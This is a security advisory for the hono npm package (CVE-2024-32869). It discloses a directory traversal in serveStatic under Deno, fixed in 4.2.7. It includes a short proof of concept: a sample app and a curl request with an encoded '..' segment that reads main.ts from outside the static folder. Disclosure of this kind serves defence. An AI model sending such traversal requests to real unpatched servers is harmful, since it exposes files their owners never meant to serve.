# Restricted Directory Traversal in serveStatic with deno

Moderate

[yusukebe](/yusukebe)
published
GHSA-3mpf-rcc7-5347
Apr 23, 2024

## Package

npm

 hono
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 4.2.7

## Patched versions

4.2.7

## Description

### Summary

When using serveStatic with deno, it is possible to directory traverse where main.ts is located.

My environment is configured as per this tutorial

<https://hono.dev/getting-started/deno>

### PoC

```
$ tree
.
├── deno.json
├── deno.lock
├── main.ts
├── README.md
└── static
    └── a.txt
```

source

```
import { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'
import { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'

const app = new Hono()
app.use('/static/*', serveStatic({ root: './' }))

Deno.serve(app.fetch)
```

request

```
curl localhost:8000/static/%2e%2e/main.ts
```

response is content of main.ts

### Impact

Unexpected files are retrieved.

### Severity

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

### CVE ID

CVE-2024-32869

### Weaknesses
